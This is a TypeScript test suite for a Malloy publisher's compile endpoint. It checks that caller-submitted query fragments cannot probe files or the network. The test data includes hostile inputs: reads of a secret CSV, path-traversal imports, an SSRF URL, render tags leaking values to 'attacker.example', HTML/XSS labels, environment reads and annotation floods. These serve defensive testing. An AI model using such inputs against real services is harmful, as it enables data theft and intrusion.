// Copyright (c) Credible Data Inc.
// SPDX-License-Identifier: MIT

/**
 * Construct containment on the `/compile` path.
 *
 * Malloy resolves a source's schema at COMPILE time -- `duckdb.sql("...")`
 * issues a `DESCRIBE` against the connection before any query runs -- so a
 * compile-only endpoint still reaches whatever the connection can reach. With
 * DuckDB's external access that makes an unrestricted compile an oracle: the
 * error text distinguishes a file that exists from one that does not, resolves
 * the columns of whatever it reads, and an `https://` path issues the request.
 *
 * These tests are written from that threat model. Each hostile case is a way
 * caller-submitted compile text could probe the filesystem or the network, and
 * each is paired with the assertion that the fragment scope refuses it. The
 * legitimate cases pin the other half of the contract: the authoring scopes
 * where the source IS the file must keep accepting `import` and
 * `connection.table(...)`, or an ordinary package becomes un-authorable.
 *
 * The oracle is the real Malloy compiler against a real DuckDB, never a
 * re-implementation of the restriction rules -- only Malloy decides which
 * spellings reach a connection.
 */

import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import fsSync from "fs";
import fs from "fs/promises";
import os from "os";
import path from "path";
import { CompileRefusedError } from "../errors";
import { renderTagRefusal } from "./compile_restriction";
import { Environment } from "./environment";

// The curated model. It publishes `base_source` and nothing else; every
// hostile fragment below tries to reach past it.
const BASE_MODEL = `source: base_source is duckdb.sql("select 1 as id, 5 as n") extend {
  measure: c is count()
}`;

const IMAGES_MODEL = `source: pics is duckdb.sql("select 'https://example.test/a.png' as pic") extend {
  dimension: # image
    pic_url is pic
}`;

const TRACKS_MODEL = `import "base.malloy"
source: tracks is base_source extend {
  measure: total is n.sum()
}`;

// A model that ENABLES the givens experiment and publishes one given. The
// refusal of a `given:` declaration has to be judged against a model where
// givens work at all: against a model without the flag, the same fragment comes
// back as an ordinary `experiment-not-enabled` diagnostic, which would pass a
// test asserting only "this did not compile" while proving nothing about the
// gate.
const GIVENS_MODEL = `##! experimental.givens
given:
  SEED :: string is 'a'
source: gsrc is duckdb.sql("select 1 as id") extend {
  dimension: seeded is $SEED
}`;

describe("compile construct containment", () => {
   let rootDir: string;
   let env: Environment;
   // A file outside the package that the model never references. Reading it,
   // or merely learning whether it exists, is the leak under test.
   let secretPath: string;
   let absentPath: string;

   beforeEach(async () => {
      rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "publisher-restrict-"));
      secretPath = path.join(rootDir, "secret.csv");
      absentPath = path.join(rootDir, "no-such-file.csv");
      await fs.writeFile(secretPath, "ssn,holder\n111-11-1111,alice\n");
      const envPath = path.join(rootDir, "env");
      await fs.mkdir(envPath, { recursive: true });
      env = await Environment.create("testEnv", envPath, []);
      await env.installPackage("pkg", async (stagingPath) => {
         await fs.mkdir(stagingPath, { recursive: true });
         await fs.writeFile(
            path.join(stagingPath, "publisher.json"),
            '{"name":"pkg"}',
         );
         await fs.writeFile(path.join(stagingPath, "base.malloy"), BASE_MODEL);
         await fs.writeFile(
            path.join(stagingPath, "images.malloy"),
            IMAGES_MODEL,
         );
         await fs.writeFile(
            path.join(stagingPath, "tracks.malloy"),
            TRACKS_MODEL,
         );
         await fs.writeFile(
            path.join(stagingPath, "givens.malloy"),
            GIVENS_MODEL,
         );
      });
   });

   afterEach(async () => {
      await fs.rm(rootDir, { recursive: true, force: true }).catch(() => {});
   });

   const compile = (
      source: string | undefined,
      scope: "append" | "file" | "package",
      modelPath = "base.malloy",
   ) => env.compileSource("pkg", modelPath, source, false, undefined, scope);

   const errorsFor = async (
      source: string,
      scope: "append" | "file" | "package",
      modelPath = "base.malloy",
   ): Promise<string[]> => {
      const { problems } = await compile(source, scope, modelPath);
      return problems
         .filter((p) => p.severity === "error")
         .map((p) => p.message);
   };

   /** The error a compile threw, or a failure if it unexpectedly succeeded. */
   const refusalFor = async (
      source: string,
      scope: "append" | "file" | "package",
      modelPath = "base.malloy",
   ): Promise<Error> => {
      try {
         await compile(source, scope, modelPath);
      } catch (error) {
         return error as Error;
      }
      throw new Error(
         `Expected the compile to be refused, but it succeeded: ${source}`,
      );
   };

   // -- the fragment scope refuses text that reaches outside the model -------

   describe('scope "append" refuses constructs that reach a connection', () => {
      it("refuses raw SQL, so the compile-time DESCRIBE never runs", async () => {
         await expect(
            compile(
               `run: duckdb.sql("SELECT * FROM read_csv('${secretPath}')") -> { group_by: ssn }`,
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      // `name!type(...)` and the `sql_*` family are classified inside
      // `computeExpression(fs)`, which needs a resolved FieldSpace -- unlike the
      // five constructs refused on sight. So they are the two the gate can
      // only see when the base model loaded, and a base model that does not
      // load has to fail the request rather than pass the fragment through.
      it("refuses a raw-SQL function call", async () => {
         await expect(
            compile(
               `run: base_source -> { group_by: v is read_csv!string('${secretPath}') }`,
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      it("refuses the fragment when the base model cannot be loaded", async () => {
         // Without this the gate compiled against no base namespace, which
         // cannot resolve `base_source`, so the construct above was never
         // classified and the real compile ran it for real.
         await expect(
            compile(
               `run: base_source -> { group_by: v is read_csv!string('${secretPath}') }`,
               "append",
               "no_such_model.malloy",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      // NAMESPACE PARITY. The gate judges the fragment against the base
      // model's COMPILED form via `extendModel`; the real compile judges it
      // against the file text. Anywhere the gate's namespace is narrower, the
      // enclosing reference fails to resolve, the construct inside it is never
      // classified, and the unrestricted compile runs it -- the same shape as
      // the no-base-model hole, reached through a name the gate cannot see.
      // Both properties below are malloy's rather than this module's, which is
      // why they are pinned here rather than reasoned about.
      it("classifies a construct reached through a non-exported source", async () => {
         await env.installPackage("exports", async (stagingPath) => {
            await fs.mkdir(stagingPath, { recursive: true });
            await fs.writeFile(
               path.join(stagingPath, "publisher.json"),
               '{"name":"exports"}',
            );
            // `helper` is deliberately outside the export list. If `extendModel`
            // seeded the namespace from `exports` rather than from every entry
            // in `contents`, `helper` would be unresolvable in the gate and
            // resolvable in the concatenated file.
            await fs.writeFile(
               path.join(stagingPath, "base.malloy"),
               `source: published is duckdb.sql("select 1 as id") extend {
  measure: c is count()
}
source: helper is duckdb.sql("select 1 as id") extend {
  measure: c is count()
}
export { published }`,
            );
         });
         await expect(
            env.compileSource(
               "exports",
               "base.malloy",
               `run: helper -> { group_by: v is read_csv!string('${secretPath}') }`,
               false,
               undefined,
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      it("classifies a construct that needs the base model's compiler flags", async () => {
         await env.installPackage("flags", async (stagingPath) => {
            await fs.mkdir(stagingPath, { recursive: true });
            await fs.writeFile(
               path.join(stagingPath, "publisher.json"),
               '{"name":"flags"}',
            );
            // The gate compiles a synthetic document that carries no `##!` of
            // its own. If the base model's flags did not ride along,
            // `sql_number` would be rejected inside the gate as
            // experiment-not-enabled -- no restricted code, so the gate passes
            // -- and then accepted by the real compile, which does see the flag.
            await fs.writeFile(
               path.join(stagingPath, "base.malloy"),
               `##! experimental.sql_functions
source: published is duckdb.sql("select 1 as id") extend {
  measure: c is count()
}`,
            );
         });
         await expect(
            env.compileSource(
               "flags",
               "base.malloy",
               "run: published -> { group_by: v is sql_number('1') }",
               false,
               undefined,
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      it("refuses direct table access", async () => {
         await expect(
            compile(
               "run: duckdb.table('secrets') -> { aggregate: n is count() }",
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      it("refuses an import that would borrow another model's surface", async () => {
         await expect(
            compile(
               'import "tracks.malloy"\nrun: tracks -> { aggregate: total }',
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      it("refuses an import that escapes the package directory", async () => {
         // The import path is caller-controlled and the URL reader resolves it
         // against the filesystem with no containment of its own, so a
         // traversal reads and compiles a model the package never published --
         // including whatever connection that model declares.
         await fs.writeFile(
            path.join(rootDir, "outside.malloy"),
            `source: outside_src is duckdb.sql("select 42 as leaked") extend {\n  measure: k is count()\n}`,
         );
         await expect(
            compile(
               'import "../../outside.malloy"\nrun: outside_src -> { aggregate: k }',
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      it("refuses a raw table smuggled in through a join", async () => {
         await expect(
            compile(
               "source: x is base_source extend {\n" +
                  "  join_cross: s is duckdb.table('secrets')\n" +
                  "}\n" +
                  "run: x -> { group_by: s.ssn }",
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });

      it("refuses a given: declaration but still allows $NAME references", async () => {
         // Two halves of one contract, which is why they are asserted together:
         // a fragment may not DECLARE a given, and may still READ one the model
         // published. Asserting only the refusal would leave the allowance free
         // to regress into a blanket ban, which reads identically from outside
         // and would break every fragment that filters on a model's given.
         const error = await refusalFor(
            "given:\n  ROLE :: string is 'x'\n",
            "append",
            "givens.malloy",
         );
         expect(error).toBeInstanceOf(CompileRefusedError);
         expect(error.message).toContain("cannot declare new givens");

         const problems = await errorsFor(
            "run: gsrc -> { group_by: seeded }",
            "append",
            "givens.malloy",
         );
         expect(problems).toEqual([]);
      });

      it("refuses a ##! compiler-flag annotation", async () => {
         // The flag line is how a fragment would turn on a language feature the
         // curated model deliberately did not, so it is refused rather than
         // honoured for the duration of one compile.
         const error = await refusalFor(
            "##! experimental.sql_functions\nrun: base_source -> { group_by: id }",
            "append",
         );
         expect(error).toBeInstanceOf(CompileRefusedError);
         expect(error.message).toContain(
            "compiler-flag annotations are not permitted",
         );
      });

      it("names the offending construct", async () => {
         // Pin the message, not merely that something threw: an author who hits
         // this needs to know which construct was refused. The message
         // deliberately does NOT name a scope that would accept the text --
         // `scope` is a caller-chosen request field, so spelling out the value
         // to switch to turns a 400 into instructions for getting past it.
         const error = await refusalFor(
            'run: duckdb.sql("SELECT 1 as x") -> { group_by: x }',
            "append",
         );
         expect(error.message).toContain("raw SQL is not permitted");
         expect(error.message).not.toContain('scope "file"');
      });
   });

   // -- the filesystem / network oracle is closed ----------------------------

   describe("the compile-time schema probe no longer reaches the filesystem", () => {
      it("cannot distinguish an existing file from a missing one", async () => {
         // The oracle: unrestricted, the present file compiles clean and the
         // absent one reports DuckDB's "No files found that match the pattern".
         // Refusing both identically is what removes the signal.
         const present = await refusalFor(
            `run: duckdb.sql("SELECT * FROM read_csv('${secretPath}')") -> { group_by: ssn }`,
            "append",
         );
         const missing = await refusalFor(
            `run: duckdb.sql("SELECT * FROM read_csv('${absentPath}')") -> { group_by: ssn }`,
            "append",
         );

         expect(present).toBeInstanceOf(CompileRefusedError);
         expect(missing).toBeInstanceOf(CompileRefusedError);
         // Same refusal either way: nothing in the response separates them.
         expect(present.message).toBe(missing.message);
         for (const message of [present.message, missing.message]) {
            expect(message).not.toContain("No files found");
            expect(message).not.toContain(secretPath);
            expect(message).not.toContain(absentPath);
         }
      });

      it("cannot enumerate the columns of a file it names", async () => {
         // Unrestricted, `ssn` resolves against the CSV's real header while a
         // bogus name reports "not defined" -- a column oracle over arbitrary
         // file content. Both must now be refused before the file is read.
         const real = await refusalFor(
            `run: duckdb.sql("SELECT * FROM read_csv('${secretPath}')") -> { group_by: ssn }`,
            "append",
         );
         const bogus = await refusalFor(
            `run: duckdb.sql("SELECT * FROM read_csv('${secretPath}')") -> { group_by: not_a_column }`,
            "append",
         );

         expect(real).toBeInstanceOf(CompileRefusedError);
         expect(bogus).toBeInstanceOf(CompileRefusedError);
         expect(bogus.message).not.toContain("not_a_column");
      });

      it("refuses an http source rather than issuing the request", async () => {
         // SSRF via the same compile-time probe. Refused on the construct, so
         // no request is made and the test needs no network.
         await expect(
            compile(
               `run: duckdb.sql("SELECT * FROM read_csv('https://example.invalid/x.csv')") -> { group_by: a }`,
               "append",
            ),
         ).rejects.toThrow(CompileRefusedError);
      });
   });

   // -- render tags that turn a value into a URL -------------------------------

   describe('scope "append" refuses render tags in text that is a document', () => {
      // The refusal is for document text, which other viewers run; a plain fragment is the caller's own compile.
      const DOCUMENT = "## artifact { kind=notebook }\n";
      const docRefusalFor = (source: string, scope: "append") =>
         refusalFor(DOCUMENT + source, scope);
      const docErrorsFor = (source: string, scope: "append") =>
         errorsFor(DOCUMENT + source, scope);
      const docCompile = (source: string, scope: "append") =>
         compile(DOCUMENT + source, scope);
      const LEAK = "https://attacker.example/p?d=";
      // An annotation runs to the end of its line, so each sits on its own.
      const grp = (annotation: string, field = "pic is 'x'") =>
         `run: base_source -> {\n  group_by:\n${annotation}\n  ${field}\n}`;
      const RENDER = "render tag";
      const HTML = "HTML in a";
      const forms: Record<string, [string, string]> = {
         "# image on a dimension": [
            `source: leaky is base_source extend {\n  dimension: # image\n    pic is concat('${LEAK}', 'x')\n}\nrun: leaky -> { group_by: pic }`,
            RENDER,
         ],
         "# image inline before the field name": [
            `source: leaky is base_source extend {\n  dimension:\n  # image\n  pic is concat('${LEAK}', 'x')\n}\nrun: leaky -> { group_by: pic }`,
            RENDER,
         ],
         "# image on a query's output field": [grp("  # image"), RENDER],
         "# link with a url_template": [
            grp(`  # link { url_template="${LEAK}$$" }`),
            RENDER,
         ],
         "# link on a view": [
            `source: leaky is base_source extend {\n  # link\n  view: v is { group_by: id }\n}\nrun: leaky -> v`,
            RENDER,
         ],
         "# image under another tag": [grp("  # column { image }"), RENDER],
         "an image tag with options": [
            grp("  # image { height=40px }"),
            RENDER,
         ],
         "HTML in a # label": [
            grp('  # label="<img src=x onerror=alert(1)>"'),
            HTML,
         ],
         "a backtick-quoted image tag": [grp("  # `image`"), RENDER],
         "a backtick-quoted link tag": [
            grp(`  # \`link\` { url_template="${LEAK}$$" }`),
            RENDER,
         ],
         "a quoted image tag (which MOTLY rejects, so it fails closed)": [
            grp('  # "image"'),
            "does not parse",
         ],
         "an image tag in a #| block": [
            `run: base_source -> {\n  group_by:\n#|\nimage\n|#\n  pic is concat('${LEAK}', 'x')\n}`,
            RENDER,
         ],
         "a link tag in a #| block": [
            `run: base_source -> {\n  group_by:\n#|\nlink { url_template="${LEAK}$$" }\n|#\n  pic is 'x'\n}`,
            RENDER,
         ],
         "an image tag after other tags in one line": [
            grp('  # label="P" hidden image'),
            RENDER,
         ],
         "a label with an escaped quote ahead of the markup": [
            grp('  # label="a\\"<img src=x>"'),
            HTML,
         ],
         "a label with a unicode escape for <": [
            grp('  # label="\\u003cimg src=x>"'),
            HTML,
         ],
         "a closing tag in a label": [grp('  # label="</b>"'), HTML],
         "a comment in a label": [grp('  # label="<!-- x -->"'), HTML],
         "an opening tag with attributes closed later in the label": [
            grp('  # label="<b onclick=x a> y"'),
            HTML,
         ],
         "a single-quoted label with markup": [
            grp("  # label='<b>x</b>'"),
            HTML,
         ],
         "an image tag nested in a viz tag's array": [
            grp("  # bar_chart { series = [ { image } ] }"),
            RENDER,
         ],
      };

      for (const [name, [source, message]] of Object.entries(forms)) {
         it(`refuses ${name}, before anything compiles`, async () => {
            const error = await docRefusalFor(source, "append");
            expect(error).toBeInstanceOf(CompileRefusedError);
            expect(error.message).toContain('scope "append"');
            // The unparseable-text refusal also names the scope, so it must be this gate that spoke.
            expect(error.message).toContain(message);
         });
      }

      it("answers a field that exists and one that does not with the same shape", async () => {
         const answer = async (field: string) =>
            (
               await docRefusalFor(
                  grp("  # image", `pic is concat('${LEAK}', ${field})`),
                  "append",
               )
            ).message;
         expect(await answer("id")).toBe(await answer("no_such_column"));
      });

      it("is not fooled by an apostrophe in a prose block ahead of the tag", async () => {
         const error = await docRefusalFor(
            `##|(markdown) intro\ndon't stop\n|##\n${grp("  # image")}`,
            "append",
         );
         expect(error.message).toContain(RENDER);
      });

      describe("an annotation that reads the environment, does not parse, or is too long", () => {
         const unsafe: Record<string, [string, string]> = {
            "an image tag valued from @env.": [
               grp("  # image=@env.HOME"),
               "@env.",
            ],
            "an image tag with an @env. property": [
               grp("  # image { alt=@env.HOME }"),
               "@env.",
            ],
            "a link tag with an @env. template": [
               grp("  # link { url_template=@env.X }"),
               "@env.",
            ],
            "an @env. value in a #| block": [
               `run: base_source -> {\n  group_by:\n#|\nimage=@env.X\n|#\n  pic is 'x'\n}`,
               "@env.",
            ],
            "markup in a label beside an @env. value": [
               grp('  # label="<img src=x>" x=@env.X'),
               "@env.",
            ],
            "an unclosed tag the renderer may read differently": [
               grp("  # image {"),
               "does not parse",
            ],
            "an annotation past the length bound": [
               grp(`  # label="${"a".repeat(9000)}"`),
               "exceeds",
            ],
         };
         for (const [name, [source, message]] of Object.entries(unsafe)) {
            it(`refuses ${name}`, async () => {
               const error = await docRefusalFor(source, "append");
               expect(error).toBeInstanceOf(CompileRefusedError);
               expect(error.message).toContain(message);
            });
         }
      });

      describe("a fragment with more annotations than any document carries", () => {
         const run = "run: base_source -> { group_by: id }";
         const timed = async (source: string) => {
            const started = performance.now();
            const error = await docRefusalFor(source, "append");
            return { error, ms: performance.now() - started };
         };

         it("refuses a body of many annotations in well under a second", async () => {
            const { error, ms } = await timed(
               `${"# a\n".repeat(250_000)}${run}`,
            );
            expect(error.message).toContain("more annotations");
            expect(ms).toBeLessThan(1500);
         });

         it("refuses an annotation count over the cap", async () => {
            const { error } = await timed(`${"# a\n".repeat(1_001)}${run}`);
            expect(error.message).toContain("more annotations");
         });

         it("refuses many long annotations, which cost parse time rather than count", async () => {
            const nested = `# ${"a{".repeat(2_700)}${"}".repeat(2_700)}\n`;
            const { error, ms } = await timed(`${nested.repeat(125)}${run}`);
            expect(error.message).toContain("more annotations");
            expect(ms).toBeLessThan(1500);
         });

         it("accepts as many annotations as the largest committed model", async () => {
            const lines = Array.from(
               { length: 322 },
               (_, i) => `# label="l${i}"`,
            ).join("\n");
            expect(
               await docErrorsFor(
                  `source: s is base_source extend {\n${lines}\n  measure: m is count()\n}\nrun: s -> { aggregate: m }`,
                  "append",
               ),
            ).toEqual([]);
         });
      });

      it("accepts every committed .malloy file, so no fixture is refused that the renderer reads fine", () => {
         const roots = [
            path.resolve(__dirname, "../../tests/fixtures"),
            path.resolve(__dirname, "../../../../examples"),
            path.resolve(__dirname, "../../../skills/skills"),
         ];
         const refused: string[] = [];
         const walk = (dir: string) => {
            for (const entry of fsSync.readdirSync(dir, {
               withFileTypes: true,
            })) {
               const full = path.join(dir, entry.name);
               if (entry.isDirectory()) {
                  if (entry.name !== "node_modules") walk(full);
               } else if (entry.name.endsWith(".malloy")) {
                  const reason = renderTagRefusal(
                     fsSync.readFileSync(full, "utf8"),
                  );
                  if (reason) refused.push(`${full}: ${reason}`);
               }
            }
         };
         for (const root of roots) walk(root);
         expect(refused).toEqual([]);
      });

      describe("a column excepted and declared again", () => {
         const shadow: Record<string, string> = {
            "a dimension in the same extend": `source: s2 is base_source extend {\n  except: id\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
            "a measure": `source: s2 is base_source extend {\n  except: c\n  measure: c is count()\n}\nrun: s2 -> { aggregate: c }`,
            "a join": `source: s2 is base_source extend {\n  except: j\n  join_one: j is base_source on j.id = id\n}\nrun: s2 -> { group_by: id }`,
            "a rename target": `source: s2 is base_source extend {\n  except: a\n  rename: a is id\n}\nrun: s2 -> { group_by: a }`,
            "an inline extend inside a query": `run: base_source extend {\n  except: id\n  dimension: id is 'x'\n} -> { group_by: id }`,
            "a backtick-quoted name": `source: s2 is base_source extend {\n  except: \`my col\`\n  dimension: \`my col\` is 'x'\n}\nrun: s2 -> { group_by: id }`,
            "a name declared in a later statement": `source: s2 is base_source extend { except: id }\nsource: s3 is s2 extend {\n  dimension: id is 'x'\n}\nrun: s3 -> { group_by: id }`,
            "a name freed by rename: and then declared": `source: leaky is base_source extend {\n  rename: id0 is id\n  dimension: id is 'x'\n}\nrun: leaky -> { group_by: id }`,
            "a backtick name with a unicode escape": `source: s2 is base_source extend {\n  except: id\n  dimension: \`\\u0069d\` is 'x'\n}\nrun: s2 -> { group_by: id }`,
            "an excepted name spelled with an escape and declared plainly": `source: s2 is base_source extend {\n  except: \`\\u0069d\`\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
            "a name declared in a chained extend": `source: s2 is base_source extend { except: id } extend {\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
         };
         for (const [name, source] of Object.entries(shadow)) {
            it(`refuses ${name}`, async () => {
               const error = await docRefusalFor(source, "append");
               expect(error).toBeInstanceOf(CompileRefusedError);
               expect(error.message).toContain("and then declares");
            });
         }

         it("accepts a name excepted in one source and declared in an unrelated one", async () => {
            // The gate must not refuse; Malloy may still report its own redefinition.
            await expect(
               docCompile(
                  `source: aa is base_source extend { except: id }\nsource: bb is base_source extend {\n  dimension: id is 7\n}\nrun: bb -> { group_by: id }`,
                  "append",
               ),
            ).resolves.toBeDefined();
         });

         it("still accepts an except: that declares nothing of the same name", async () => {
            const errors = await docErrorsFor(
               `source: s2 is base_source extend {\n  except: id\n  dimension: label is 'x'\n}\nrun: s2 -> { aggregate: c }`,
               "append",
            );
            expect(errors).toEqual([]);
         });
      });

      const accepted: Record<string, string> = {
         "a field named link used as a tag value": `run: base_source -> {\n  group_by:\n  # bar_chart { x = link }\n  link is 'x'\n}`,
         "a field named image in a pivot list": `run: base_source -> {\n  group_by:\n  # pivot { dimensions=[image] }\n  image is 'x'\n}`,
         "prose that starts with a tag name in a #| block": `run: base_source -> {\n  group_by:\n#|(markdown)\n# link to the data\n|#\n  pic is 'x'\n}`,
         "a model-level ## image note": `## image\nrun: base_source -> { group_by: pic is 'x' }`,
         "a doc note naming image": `#(docs) image of the data\nrun: base_source -> { group_by: pic is 'x' }`,
         "a label that mentions a less-than sign": `run: base_source -> {\n  group_by:\n  # label="a < b"\n  id\n}`,
         "a label with an unclosed angle bracket in text": `run: base_source -> {\n  group_by:\n  # label="Actual<Target"\n  id\n}`,
         "a label that compares a<b": `run: base_source -> {\n  group_by:\n  # label="a<b"\n  id\n}`,
         "a field-level artifact tag with a bare filter literal": `# artifact { autorun=false givens { REGION=f'US' } }\nquery: regions is base_source -> { group_by: id }`,
      };
      for (const [name, source] of Object.entries(accepted)) {
         it(`accepts ${name}`, async () => {
            const { problems } = await docCompile(source, "append");
            expect(
               problems.filter(
                  (p) => p.code === "restricted-construct-forbidden",
               ),
            ).toEqual([]);
         });
      }

      it("leaves a caller field with unrelated tags alone", async () => {
         const errors = await docErrorsFor(
            `source: s is base_source extend {\n  # label="Rows"\n  measure: rows is count()\n  # bar_chart\n  view: v is { aggregate: rows }\n}\nrun: s -> v`,
            "append",
         );
         expect(errors).toEqual([]);
      });

      it("does not read a tag name inside a string or a comment as a tag", async () => {
         const errors = await docErrorsFor(
            `// # image\nrun: base_source -> { group_by: # label="an image link"\n x is 'image'\n}`,
            "append",
         );
         expect(errors).toEqual([]);
      });

      describe("plain append text, which is the caller's own compile", () => {
         const plain: Record<string, string> = {
            "# image on a field": grp("  # image"),
            "# link with a template": grp(
               `  # link { url_template="${LEAK}$$" }`,
            ),
            "markup in a label": grp('  # label="<b>x</b>"'),
            "an unparseable annotation": grp("  # image {"),
            "an @env. value": grp("  # label=@env.HOME"),
            "an except: and a redeclaration": `source: s2 is base_source extend {\n  except: id\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
         };
         for (const [name, source] of Object.entries(plain)) {
            it(`is not refused for ${name}`, async () => {
               // Malloy may still report its own problem; only this gate's refusal is excluded.
               const outcome = await compile(source, "append").then(
                  () => undefined,
                  (caught: unknown) => caught,
               );
               expect(outcome).not.toBeInstanceOf(CompileRefusedError);
            });
         }
      });

      it("compiles a plain fragment with # image and # link, as it did before document text was held to the tags", async () => {
         for (const annotation of [
            "  # image",
            `  # link { url_template="${LEAK}$$" }`,
         ]) {
            expect(await errorsFor(grp(annotation), "append")).toEqual([]);
         }
      });

      it("keeps a model-defined # image working", async () => {
         const { problems } = await compile(
            `run: pics -> { group_by: pic_url }`,
            "append",
            "images.malloy",
         );
         expect(problems.filter((p) => p.severity === "error")).toEqual([]);
      });

      it("does not refuse the model file's own tags at scope file", async () => {
         const { problems } = await compile(IMAGES_MODEL, "file");
         expect(problems.filter((p) => p.severity === "error")).toEqual([]);
      });
   });

   // -- ordinary authoring keeps working -------------------------------------

   describe('scope "append" still validates ordinary fragments', () => {
      it("accepts a query over the model's published source", async () => {
         expect(
            await errorsFor("run: base_source -> { aggregate: c }", "append"),
         ).toEqual([]);
      });

      it("accepts the documented top-level query: fragment form", async () => {
         expect(
            await errorsFor(
               "query: check is base_source -> { aggregate: c }",
               "append",
            ),
         ).toEqual([]);
      });

      it("accepts the documented throwaway extend form", async () => {
         expect(
            await errorsFor(
               "source: check is base_source extend { measure: m2 is c }",
               "append",
            ),
         ).toEqual([]);
      });

      it("still reports an ordinary compile error as a diagnostic, not a refusal", async () => {
         // The gate must not swallow or restyle ordinary problems: a bad field
         // is still a diagnostic with its own message, not a 400 refusal.
         const errors = await errorsFor(
            "run: base_source -> { group_by: no_such_field }",
            "append",
         );
         expect(errors.join(" ")).toContain("no_such_field");
      });
   });

   // -- the authoring scopes are deliberately NOT restricted -----------------

   describe('scopes "file" and "package" still accept authoring constructs', () => {
      it("file: a model may define its own source from raw SQL", async () => {
         // The source IS the file here, so this is an author writing a model,
         // not a caller probing one. Restricting it would make the package
         // un-authorable.
         expect(
            await errorsFor(
               `source: fresh is duckdb.sql("select 2 as id") extend {\n  measure: c is count()\n}`,
               "file",
            ),
         ).toEqual([]);
      });

      it("file: a model may import another model in the package", async () => {
         expect(
            await errorsFor(
               'import "base.malloy"\nsource: derived is base_source extend { measure: c2 is c }',
               "file",
               "derived.malloy",
            ),
         ).toEqual([]);
      });

      it("package: a what-if replacement may use raw SQL and imports", async () => {
         const { problems } = await compile(
            'import "base.malloy"\nsource: tracks is base_source extend { measure: total is n.sum() }',
            "package",
            "tracks.malloy",
         );
         expect(problems.filter((p) => p.severity === "error")).toEqual([]);
      });
   });
});
